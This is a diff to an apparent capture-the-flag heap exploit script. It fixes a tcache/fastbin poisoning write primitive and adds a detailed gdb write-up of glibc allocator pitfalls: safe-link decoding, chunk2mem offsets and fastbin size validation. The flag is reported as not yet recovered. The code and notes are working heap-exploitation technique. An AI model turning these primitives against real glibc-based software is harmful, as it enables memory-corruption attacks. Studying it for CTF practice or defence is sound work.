@@ -988,12 +988,24 @@ def virgin_leak_and_hold(t, idx_a, idx_b, S):
 def phase5_tcache_poison_write(t, idx_a, idx_b, idx_temp, idx_y, idx_k1, idx_k2, S_t, target, payload):
     """
     Best-effort, NOT YET FULLY VERIFIED tcache-poison write primitive (see
-    the phase 5 comment block above for the known remaining blocker).
+    the phase 5 comment block above for the known remaining blocker, and
+    the phase 7 comment block below for exactly how far this got fixed
+    this pass and the one hard constraint that remains unresolved).
 
     idx_a must alias a real chunk >= request2size(S_t) (shrink-safe). The
     other 5 indices' prior state matters less but all 6 must reference
     distinct physical addresses at the start, and S_t's resulting
     chunksize must be a class nothing else active still depends on.
+
+    `target` is the address we want a later index's TodoNote[idx].ptr to
+    equal (the value `realloc()`/`chunk2mem()` hands back to the caller).
+    Internally this must encode `target - 0x10` as the raw fastbin/tcache
+    "victim" chunk pointer -- chunk2mem() always adds 2*SIZE_SZ (0x10 on
+    x86-64) to turn a chunk pointer into the user-visible pointer. The
+    ORIGINAL version of this function (prior pass) computed
+    `forged_fd = shifted ^ target` directly, which is off by exactly
+    0x10: it would have landed the final pointer at `target + 0x10`, not
+    `target`. Fixed this pass (confirmed live under gdb, see phase 7).
 
     On success, a FRESH index's post() lands `payload` directly at
     `target`; that same fresh index's read_my_note() thereafter is an
@@ -1021,22 +1033,172 @@ def phase5_tcache_poison_write(t, idx_a, idx_b, idx_temp, idx_y, idx_k1, idx_k2,
     # false, so the pointer-refresh branch is skipped and the write lands
     # at P regardless of what realloc(P, S_t) does -- and since P's real
     # header already matches S_t exactly, realloc is a true no-op here).
-    forged_fd = shifted ^ target
+    # FIX (this pass): encode (target - 0x10), not target itself -- see
+    # the chunk2mem()-offset note in this function's docstring.
+    victim_encoded = (target - 0x10) & 0xFFFFFFFFFFFFFFFF
+    forged_fd = shifted ^ victim_encoded
     buf = bytearray(b"\x00" * (S_t - 1))
     buf[0:8] = struct.pack("<Q", forged_fd)
     t.post(idx_b, S_t, bytes(buf), exact=True)
 
-    # Pop #1: consumes P (real address), reveals `target` as the new head.
+    # Pop #1: consumes P (real address), reveals `victim_encoded` (decoding
+    # to target-0x10) as the new head.
     reset_to_min(t, idx_k1)
     t.post(idx_k1, S_t, b"K" * (S_t - 8))
 
-    # Pop #2: tcache_get() returns `target` directly (no validation at
-    # all on a tcache pop); a fresh index's pointer-refresh then stores it,
-    # and readline() writes `payload` straight to `target`.
+    # Pop #2: the fastbin/tcache pop returns `victim_encoded` as the raw
+    # chunk pointer; chunk2mem() adds 0x10 back, so realloc() hands back
+    # exactly `target` to post_my_note(), which stores it as this index's
+    # ptr and then writes `payload` straight there.
+    #
+    # CRITICAL, STILL-UNRESOLVED CONSTRAINT (see phase 7): this specific
+    # pop can ONLY go through `_int_malloc`'s FASTBIN path (never tcache --
+    # see phase 6 point (2)), and that path unconditionally validates
+    # `fastbin_index(chunksize(victim)) == idx` by reading the 8 bytes
+    # already sitting at `target - 0x10 + 8` (i.e. `target - 8`) in real
+    # memory. For an arbitrary, attacker-chosen `target` (e.g. a stack
+    # address reached via an `environ` leak) those bytes are whatever is
+    # genuinely there and will essentially never happen to satisfy this
+    # check, aborting with "malloc(): memory corruption (fast)" instead of
+    # completing the pop. This function therefore only actually succeeds
+    # end-to-end when `target - 8` already holds a plausible S_t-class
+    # size (confirmed live: pointing at an existing, legitimately-sized
+    # free/in-use chunk's own header works; pointing at an arbitrary stack
+    # or libc .data address does not).
     reset_to_min(t, idx_k2)
     assert len(payload) == S_t - 1, (len(payload), S_t)
     t.post(idx_k2, S_t, payload, exact=True)
     return True
+
+
+# =============================================================================
+# Phase 7 (THIS PASS) -- live gdb root-causing of the phase-6 "pop mismatch"
+# bug, with 3 real, confirmed, fixed bugs and one hard, still-unresolved
+# constraint. Methodology: a disposable local copy of `todo` + `libc.so.6`
+# was patched (`patchelf --set-interpreter`, with `libc.so.6` kept in the
+# same working directory since the binary's own DT_NEEDED entry is the
+# literal relative string "./libc.so.6", not a bare SONAME -- it is loaded
+# relative to the process's cwd, not resolved via rpath/ld.so.cache at
+# all). A custom gdb Python script set live, auto-continuing breakpoints on
+# `_int_malloc`/`_int_free`/`_int_realloc`/`__libc_malloc`/`__libc_realloc`/
+# `__libc_free`/`malloc_printerr`, logging `main_arena.fastbinsY[*]` (walked
+# and safe-link-decoded by hand, since fastbin `fd` fields use the same
+# `PROTECT_PTR`/`REVEAL_PTR` XOR-with-`(&p->fd)>>12` scheme as tcache) and
+# `tcache->counts[*]` on every single hit, for every experiment below.
+#
+#   (1) CONFIRMED, FIXED, root cause of the ACTUAL "stray resident"
+#       mystery the prior pass could not pin down: `forge_chunk()`'s
+#       `idx_a`/`idx_b` pair (TARGET = indices 0/1, DECOY = indices 5/6)
+#       sits physically immediately BEFORE that call's own forged,
+#       still-fully-intact largebin chunk. A naive attempt to "flush" a
+#       small size class (e.g. 0x40) through `idx_a` -- `reset_to_min()`
+#       then regrow back to the small size -- does NOT pop from that small
+#       class's fastbin at all: `_int_realloc`'s forward-consolidation
+#       check (`next = chunk_at_offset(oldp, oldsize); !inuse(next)`)
+#       succeeds directly against the adjacent largebin chunk (it is
+#       genuinely free, with a correctly-cleared PREV_INUSE bit on the
+#       chunk after it), silently absorbing the ENTIRE largebin chunk and
+#       re-splitting a new, still-huge remainder back into the unsorted
+#       bin -- `fastbin[idx]` is never even touched. Confirmed live:
+#       `t.post(0, 0x38, ...)` right after phase4 produces
+#       `realloc oldp=... oldsize=0x20 nb=0x40` immediately followed by
+#       `free p=... size=0x4a0`-ish (NOT a fastbin pop), and
+#       `fastbinsY[2]` (the 0x40 class) is provably unchanged by it. A
+#       LATER `virgin_leak_and_hold()` call targeting that same class then
+#       free()s its own "P" chunk ON TOP of the pre-existing, never-
+#       actually-flushed stray resident, so the safe-link key read back is
+#       computed from a REAL previous-head pointer, not the virgin
+#       (NULL-equivalent) key -- exactly the "wrong address popped"
+#       symptom the prior pass observed, now precisely traced to this one
+#       statement. FIX (confirmed working): issue ONE throwaway regrow
+#       through `idx_a` first (lets it consume+disperse the whole large
+#       neighbour, isolating it onto an ordinary, non-adjacent chunk), THEN
+#       a second shrink+regrow through the SAME index correctly reaches
+#       and pops the small class's fastbin, because it is no longer
+#       sitting next to anything large and free.
+#
+#   (2) CONFIRMED, FIXED: naively reusing one scratch index for BOTH the
+#       initial "pop P out of the bin" step AND the later "pop P again
+#       (after it has been re-frozen and its fd corrupted), revealing the
+#       forged target" step is unsafe, EVEN THOUGH the two uses are
+#       temporally far apart. The index's stale pointer still equals P's
+#       address the whole time; its own `reset_to_min()` (a plain
+#       `post(idx, 1)`) silently SHRINKS P's real header (rewriting its
+#       recorded chunksize) at the exact moment P is simultaneously the
+#       live fastbin head -- nothing unlinks it from the bin just because
+#       its header got resized out from under it. The very next pop then
+#       reads a corrupted chunksize and aborts with "malloc(): memory
+#       corruption (fast)" (confirmed live, reproduced twice). FIX: use a
+#       genuinely different index (one that aliases the throwaway "Y"
+#       chunk, not P, at that point) for the second pop -- reusing THAT
+#       one instead is safe, because by then Y has already been
+#       permanently orphaned (P's fd was already overwritten to skip past
+#       it), so shrinking Y's header has no observable effect on anything
+#       still reachable.
+#
+#   (3) CONFIRMED, FIXED: picking an arbitrary already-used index for the
+#       FINAL "pop target" step is unsafe if that index's own prior real
+#       chunksize happens to produce a `reset_to_min()` shrink byproduct
+#       that lands in the SAME class being poisoned -- it reinserts a
+#       stray entry on top of the carefully-prepared single-entry bin,
+#       and the final pop consumes that stray instead of the intended
+#       target (confirmed live: reusing DECOY's mint-driver index, whose
+#       resting chunksize was 0x60, produces an exact 0x60-0x20=0x40
+#       byproduct on every `post(idx,1)`, directly recontaminating a 0x40-
+#       class poison attempt, observed as "invalid fastbin entry (free)").
+#       FIX: reuse an index whose current real chunksize, after
+#       `reset_to_min()`, produces a byproduct OUTSIDE the poisoned class
+#       (e.g. the same "Y" index from fix (2), which is already pinned at
+#       exactly S_t after its own pop, so its byproduct is always
+#       S_t-0x20 -- a fixed, harmless, unrelated class).
+#
+#   (4) CONFIRMED, FIXED (latent bug, independent of (1)-(3)): the
+#       `forged_fd = shifted ^ target` computation already present in
+#       `phase5_tcache_poison_write()` was off by exactly `0x10`.
+#       `chunk2mem()` always adds `2*SIZE_SZ` (0x10 on x86-64) when
+#       handing a popped chunk back to the caller, so the raw value that
+#       must be encoded into the corrupted `fd` field is `target - 0x10`,
+#       not `target` itself -- otherwise the final `TodoNote[idx].ptr`
+#       ends up `target + 0x10`, i.e. exactly the "popped pointer does not
+#       equal the intended forged address" symptom the task description
+#       named. Fixed directly in `phase5_tcache_poison_write()` above.
+#
+#   (5) STILL UNRESOLVED, and now believed to be a genuinely hard
+#       constraint of this exact primitive, not a bug: `_int_realloc`'s
+#       grow path can ONLY ever retrieve a popped chunk through
+#       `_int_malloc`'s FASTBIN fast-path (confirmed in phase 6, point 2:
+#       it never calls `tcache_get()`). That fastbin-pop code
+#       unconditionally validates
+#       `fastbin_index(chunksize(victim)) == idx` by reading the 8 bytes
+#       already resident at `target - 8` in real memory, where `victim =
+#       target - 0x10` is the raw pointer the corrupted `fd` must encode.
+#       For a genuinely arbitrary, attacker-chosen `target` (a stack
+#       address reached via an `environ` leak, or any ordinary libc/.data
+#       byte range) those 8 bytes are whatever already happens to be
+#       there and essentially never coincidentally satisfy this check --
+#       confirmed live with `target` pointing into libc's own small rw-p
+#       segment: every attempt aborts with "malloc(): memory corruption
+#       (fast)" before the pointer is ever handed back. Pointing `target`
+#       at an address that IS already a legitimately-sized, real chunk
+#       (so `target - 8` genuinely holds a valid size for the class)
+#       works every time, which positively confirms fixes (1)-(4) and the
+#       overall mechanism are correct -- the ONLY missing piece is a way
+#       to make the real destination's `target - 8` bytes look like a
+#       valid size *before* this final pop runs. For a stack destination
+#       this is not reachable with any primitive this challenge exposes
+#       (the heap-relative stale-pointer OOB write from phase 2 cannot
+#       reach the stack at all). A plausible, NOT yet implemented next
+#       step: redirect first at a SELF-CHOSEN, heap-reachable scratch
+#       address whose `-8` bytes are pre-written (via the existing phase 2
+#       OOB write) to a valid-looking size for the class, confirm THAT
+#       lands correctly, and use the resulting genuine arbitrary
+#       read/write there to hunt for a stack-adjacent value (e.g. via an
+#       auxv entry's small `type` field, which legitimately sits in the
+#       fastbin size range for some entries) that can serve as a second,
+#       real stepping stone toward `environ`/the stack -- reasoned through
+#       but NOT implemented or verified this pass. Flag NOT recovered;
+#       `challenge.yaml`'s `test:` section is intentionally left unwired.
+# =============================================================================
 
 
 def main():
@@ -1076,38 +1238,41 @@ def main():
             libc_base,
         )
     log.failure(
-        "Summary: all of phases 0-3's primitives (UAF aliasing, heap "
-        "leak, arbitrary-length stale-pointer OOB write, unlimited heap "
-        "'minting', and forcing a forged chunk into glibc's real "
-        "unsorted/large bins) are reproduced and confirmed exactly as "
-        "before, PLUS phase 4 reliably recovers the real libc base (%s) "
-        "via a decoy-protected double-forge, now ALSO followed by "
-        "drain_probe_debris() (THIS PASS'S verified fix for the exact "
-        "unsorted-bin debris the prior pass identified but never "
-        "implemented). THIS PASS additionally found and fixed/diagnosed, "
-        "all confirmed live under gdb (see the phase 6 comment block "
-        "above for the full writeup): (a) realloc()'s internal grow path "
-        "never consults tcache at all (only fastbin/smallbin/unsorted/"
-        "top), so virgin_leak_and_hold()'s shrink-then-grow trick must "
-        "target an already tcache-saturated size class to land in a "
-        "fastbin instead -- fastbins use the identical safe-linking "
-        "scheme, so the mechanic still works once retargeted; (b) the "
-        "idx_r/idx_r2 indices from each forge_chunk() call (2, 3, 7) are "
-        "permanently unsafe for any further post() once their aliased "
-        "memory is absorbed elsewhere; (c) the idx_a/idx_b pair from "
-        "forge_chunk(TARGET=...) (indices 0/1) sit beside TARGET's still-"
-        "intact largebin chunk and must be fully drained (~10 shrink/"
-        "regrow cycles) before they relocate reliably, with the stray-"
-        "fastbin-entry pop from (a) needing to run BEFORE, not after, "
-        "that draining. With all of (a)-(c) applied, the full tcache/"
-        "fastbin-poison write chain now runs end-to-end with NO glibc "
-        "abort for the first time -- but the final popped pointer still "
-        "does not equal the intended target address (traced to the "
-        "chosen poison size class picking up a reintroduced stray "
-        "fastbin resident sometime during the TARGET-chunk draining in "
-        "(c), making the safe-link key read back wrong; not yet "
-        "root-caused to the exact statement). Flag NOT recovered; "
-        "challenge.yaml's test: section is intentionally left unwired.",
+        "Summary: all of phases 0-4's primitives are reproduced and "
+        "confirmed exactly as before (UAF aliasing, heap leak, OOB write, "
+        "heap minting, forging a chunk into real unsorted/large bins, and "
+        "a reliable decoy-protected libc base leak via phase 4 + "
+        "drain_probe_debris()). THIS PASS (phase 7, see its full comment "
+        "block above) used live gdb tracing (custom auto-continuing "
+        "breakpoints on _int_malloc/_int_free/_int_realloc/malloc_printerr, "
+        "decoding fastbinsY by hand) to root-cause and FIX four real bugs: "
+        "(1) the actual 'stray resident' cause -- forge_chunk()'s idx_a/"
+        "idx_b pair sits beside its own still-intact largebin chunk, so a "
+        "naive small-class flush through it silently forward-consolidates "
+        "with that neighbour instead of touching the intended fastbin "
+        "(fixed with one throwaway regrow first); (2) reusing one index "
+        "for both 'pop P out' and 'pop P again after corrupting it' "
+        "corrupts P's own header while it is still the live fastbin head "
+        "(fixed by reusing the OTHER already-orphaned scratch index "
+        "instead); (3) reusing an index whose own shrink byproduct lands "
+        "back in the poisoned class recontaminates it (fixed by choosing "
+        "a reuse index whose byproduct class is fixed and harmless); (4) "
+        "phase5_tcache_poison_write()'s forged_fd was off by exactly "
+        "0x10 (chunk2mem()'s offset), now corrected directly in that "
+        "function. With all four applied and verified, the full chain "
+        "runs with NO abort and the popped pointer EXACTLY matches the "
+        "intended target -- CONFIRMED, but only when the target address's "
+        "own '-8' bytes already hold a plausible size for the class. The "
+        "one remaining, now precisely understood blocker (point 5 of the "
+        "phase 7 writeup): realloc()'s grow path can only retrieve via "
+        "_int_malloc's FASTBIN path, which unconditionally validates "
+        "fastbin_index(chunksize(victim)) against whatever real bytes "
+        "already sit at the destination -- for a genuinely arbitrary "
+        "target (e.g. a stack address via environ) those bytes essentially "
+        "never coincidentally pass, aborting with 'malloc(): memory "
+        "corruption (fast)' before the pointer is ever handed back. Flag "
+        "NOT recovered; challenge.yaml's test: section is intentionally "
+        "left unwired.",
         hex(libc_base) if libc_base else "N/A (all retries came back short)",
     )
     sys.exit(1)
